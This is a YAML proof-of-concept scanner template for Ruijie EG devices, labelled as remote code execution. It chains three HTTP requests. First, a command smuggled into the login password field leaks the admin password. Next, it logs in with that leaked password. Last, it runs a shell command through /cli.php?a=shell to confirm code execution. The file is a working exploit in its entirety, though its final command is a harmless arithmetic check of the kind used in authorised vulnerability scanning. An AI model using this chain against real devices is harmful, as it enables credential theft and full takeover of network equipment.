id: poc-yaml-ruijie-eg-cli-rce
info:
  name: Ruijie Eg Cli 远程代码执行漏洞
  severity: medium
  tags:
  - rce
  finger: Ruijie Eg Cli
  reference: []
  description: null
variables:
  r1: random_int(8000, 10000)
  r2: random_int(8000, 10000)
transport: http
requests:
- method: POST
  path: /login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password=admin?show+webmaster+user
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "text/json")
  output:
  - regex_match(body,"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)")
- method: POST
  path: /login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password={{.password}}
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "text/json") && contains(headers, "Set-Cookie") && contains(headers, "user=admin")
    && contains(body, "{\"data\":\"0\",\"status\":1}")
  output: []
- method: POST
  path: /cli.php?a=shell
  headers: {}
  data: notdelay=true&command=expr {{.r1}} * {{.r2}}
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, r1 * r2)
  output: []
